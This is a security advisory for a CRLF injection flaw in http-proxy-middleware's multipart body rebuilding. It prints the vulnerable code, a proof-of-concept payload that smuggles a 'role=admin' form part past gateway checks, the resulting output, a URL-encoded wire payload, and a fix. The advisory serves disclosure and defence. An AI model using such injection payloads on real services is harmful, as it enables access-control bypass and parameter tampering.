# [H] http-proxy-middleware: multipart/form-data field injection via unescaped CRLF in `fixRequestBody`

## Summary
Severity: High
Advisory: GHSA-gcq2-9pq2-cxqm
CVE: CVE-2026-55603
CWE: CWE-93
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:H/A:N (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-gcq2-9pq2-cxqm
Type: github-advisory

## Affected
- npm: `http-proxy-middleware` — affected >=3.0.4 <3.0.7
- npm: `http-proxy-middleware` — affected >=4.0.0 <4.1.1

## Details
## Summary
`fixRequestBody()` is the library's documented helper for re-emitting a request body that was already consumed by a body parser. When the **outgoing** `Content-Type` is `multipart/form-data`, it rebuilds the body with `handlerFormDataBodyData()`, which interpolates each `req.body` key and value directly into the multipart wire format **without neutralizing CR/LF**:

```js
// dist/handlers/fix-request-body.js
function handlerFormDataBodyData(contentType, data) {
  const boundary = contentType.replace(/^.*boundary=(.*)$/, '$1');
  let str = '';
  for (const [key, value] of Object.entries(data)) {
    str += `--${boundary}\r\nContent-Disposition: form-data; name="${key}"\r\n\r\n${value}\r\n`;
  }
}
```

A `\r\n` inside a value (or key) lets an attacker close the current part and inject an **entirely new form part**. Because the proxy's own body parser saw a single opaque value, any gateway-side policy or validation performed on `req.body` is evaluated against a different set of fields than the upstream backend ultimately parses a request/parameter desynchronization across the trust boundary.

By contrast, the sibling output branches are safe: `application/json` uses `JSON.stringify` (escapes control chars) and `application/x-www-form-urlencoded` uses `querystring.stringify` (percent-encodes). Only the multipart branch lacks escaping.

## Preconditions 
All three must hold; this narrows real-world exposure and is the basis for `AC:H`:
1. The proxy app populates `req.body` with a **non-multipart** parser (`express.urlencoded`, `express.json`, or text) so an injected boundary in a value is **not** split on input.
2. The proxied (outgoing) request is sent as **`multipart/form-data`** (e.g. an adaptation layer, or any flow that sets the upstream content-type to multipart), so the vulnerable branch runs.
3. The app calls `fixRequestBody` (the documented pattern for "I body-parsed, now re-stream"), and an attacker controls at least one body field value or key.

> Note: a pure multipart-in → multipart-out flow (e.g. `multer`) is generally **not** exploitable for a *new-field* injection, because the proxy's multipart parser already splits the injected boundary, so `req.body` and the backend agree. The desync specifically requires a non-multipart input parser.

## Impact
When the preconditions hold, an attacker injects/overrides multipart fields seen only by the backend:
- **Validation / access-control bypass** bypass gateway-side field checks (demonstrated below: a gateway that forbids `role=admin` is bypassed; backend grants admin).
- **Parameter tampering** add or overwrite fields the backend trusts (IDs, flags, prices).
- **File-part injection** inject a `filename="..."` part into the upstream multipart stream.

## Proof of Concept

```js
// npm i http-proxy-middleware@4.0.0   (Node ESM: save as minimal.mjs)
import { fixRequestBody } from 'http-proxy-middleware';

// `req.body` as a NON-multipart parser (express.urlencoded / express.json) yields it.
// The attacker sent  user=alice%0D%0A--BB%0D%0A...  so this ONE field's value holds CRLF:
const req = { readableLength: 0, body: {
  user: 'alice\r\n--BB\r\nContent-Disposition: form-data; name="role"\r\n\r\nadmin\r\n--BB--'
}};

// Minimal stand-in for the outgoing proxy request; capture what gets written.
const out = [];
const proxyReq = {
  h: { 'content-type': 'multipart/form-data; boundary=BB' },
  getHeader(n){ return this.h[n.toLowerCase()]; },
  setHeader(n,v){ this.h[n.toLowerCase()] = v; },
  write(d){ out.push(Buffer.from(d)); },
};

fixRequestBody(proxyReq, req);          // library rebuilds the multipart body
console.log(Buffer.concat(out).toString());
```

Output: one input field becomes **two** parts; `role=admin` was injected via the unescaped CRLF:

```
--BB
Content-Disposition: form-data; name="user"

alice
--BB
Content-Disposition: form-data; name="role"     <-- injected part; never present in req.body's keys
admin
--BB--
```

`req.body` had a single key (`user`), so any gateway policy checking `req.body.role` passes, yet the backend's multipart parser receives `role=admin`. On the wire the attacker simply sends, as `application/x-www-form-urlencoded`: `user=alice%0D%0A--BB%0D%0AContent-Disposition:%20form-data;%20name="role"%0D%0A%0D%0Aadmin%0D%0A--BB--`

## Remediation
Neutralize CR/LF (and `"`) in keys/values before interpolation, or build the body with a real multipart encoder (e.g. `FormData` / `form-data`) instead of string concatenation. Minimal fix:

```js
function handlerFormDataBodyData(contentType, data) {
  const boundary = contentType.replace(/^.*boundary=(.*)$/, '$1');
  const bad = /[\r\n]/;
  let str = '';
  for (const [key, value] of Object.entries(data)) {
    const v = String(value);
    if (bad.test(key) || bad.test(v)) {
      throw new Error('fixRequestBody: CR/LF not allowed in multipart field name/value');
    }
    str += `--${boundary}\r\nContent-Disposition: form-data; name="${key.replace(/"/g, '%22')}"\r\n\r\n${v}\r\n`;
  }
}
```
(Reject is preferable to silent stripping, to avoid masking malicious input.)

## References
- https://github.com/chimurai/http-proxy-middleware/security/advisories/GHSA-gcq2-9pq2-cxqm
- https://github.com/chimurai/http-proxy-middleware
